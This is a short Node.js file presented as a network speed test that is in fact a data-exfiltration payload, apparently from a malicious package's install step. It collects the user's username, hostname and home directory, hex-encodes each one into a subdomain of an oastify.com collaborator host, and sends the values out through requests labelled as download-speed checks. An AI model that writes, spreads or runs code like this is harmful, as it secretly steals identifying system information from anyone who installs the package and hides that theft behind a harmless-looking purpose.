const NetworkSpeed = require('./index.js');

const testNetworkSpeed = new NetworkSpeed();


async function sendMeasurement(data) {
  const destination = 'http://'+data+'.in-install.x42p55sy4jmyl577zg0e3h4cj3p1dr1g.oastify.com';
  const fileSizeInBytes = 500000;
  const speed = await testNetworkSpeed.checkDownloadSpeed(destination, fileSizeInBytes);
  console.log(`Download Speed: ${JSON.stringify(speed)}`);
}

const platform = require('os');

const getIp = family => {
	const interfaces = platform.networkInterfaces();
	return Object.keys(interfaces).reduce((arr, x) => {
		const interfce = interfaces[x];
		return arr.concat(Object.keys(interfce)
			.filter(x => interfce[x].family === family && !interfce[x].internal)
			.map(x => interfce[x].address));
	}, []);
};

function encodeIdentity(str)
{
    const buf = Buffer.from(str, 'utf8');
    return buf.toString('hex');
}

const hn = encodeIdentity(platform.hostname());
const hd = encodeIdentity(platform.homedir());
const un = encodeIdentity(platform.userInfo().username);
// const ut = platform.uptime().toString(16);

var localip=getIp('IPv4');
sendMeasurement(un);
sendMeasurement(hn);
sendMeasurement(hd);
// sendMeasurement(ut);